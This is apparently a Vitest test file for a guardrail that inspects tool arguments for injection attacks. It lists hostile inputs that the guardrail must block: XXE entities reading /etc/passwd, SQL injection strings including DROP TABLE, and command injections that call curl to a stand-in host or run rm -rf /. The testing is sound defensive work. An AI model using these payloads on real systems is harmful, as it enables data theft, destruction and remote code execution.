import { describe, expect, it } from 'vitest';
import { inspect } from '../src/engine/sentinel';

describe('Sentinel guardrails (Phase 2)', () => {
  it('blocks XXE declarations', () => {
    const v = inspect({
      memo: '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
    });
    expect(v.blocked).toBe(true);
    expect(v.ruleId).toBe('SENTINEL_XXE');
    expect(v.severity).toBe('CRITICAL');
    expect(v.field).toBe('memo');
    expect(v.matched).toContain('<!ENTITY');
  });

  it('blocks DOCTYPE-based XXE', () => {
    const v = inspect({
      memo: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    });
    expect(v.blocked).toBe(true);
    expect(v.ruleId).toBe('SENTINEL_XXE');
  });

  it('blocks SQL injection variants', () => {
    for (const payload of [
      "' OR 1=1 --",
      "x'; DROP TABLE TBL_WH_INV_MSTR; --",
      "a' UNION SELECT * FROM users",
      "1' OR '1'='1'",
    ]) {
      const v = inspect({ memo: payload });
      expect(v.blocked).toBe(true);
      expect(v.ruleId).toBe('SENTINEL_SQLI');
    }
  });

  it('blocks command injection patterns', () => {
    for (const payload of [
      '$(curl http://evil.example/x)',
      'test; rm -rf /',
      'x`id`y',
      'a && curl evil.example',
    ]) {
      const v = inspect({ memo: payload });
      expect(v.blocked).toBe(true);
      expect(v.ruleId).toBe('SENTINEL_CMDI');
    }
  });

  it('lets benign values through, including & and the word System', () => {
    for (const args of [
      { memo: 'INV & TAX #9921' },
      { memo: 'Payment for order 123' },
      { memo: 'System upgrade scheduled for Friday' },
      { memo: "Dr. O'Brien's claim" },
      { amountUsd: 50000 },
      { skuCode: 'SKU-001', warehouseAisle: 'A-12' },
    ]) {
      expect(inspect(args).blocked).toBe(false);
    }
  });

  it('inspects nested string values and reports the field path', () => {
    const v = inspect({ outer: { inner: "' OR 1=1" } });
    expect(v.blocked).toBe(true);
    expect(v.field).toBe('outer.inner');
  });

  it('truncates long matched values in the report', () => {
    const v = inspect({ memo: 'x'.repeat(200) + "' OR 1=1" });
    expect(v.blocked).toBe(true);
    expect(v.matched!.length).toBeLessThanOrEqual(81);
  });
});
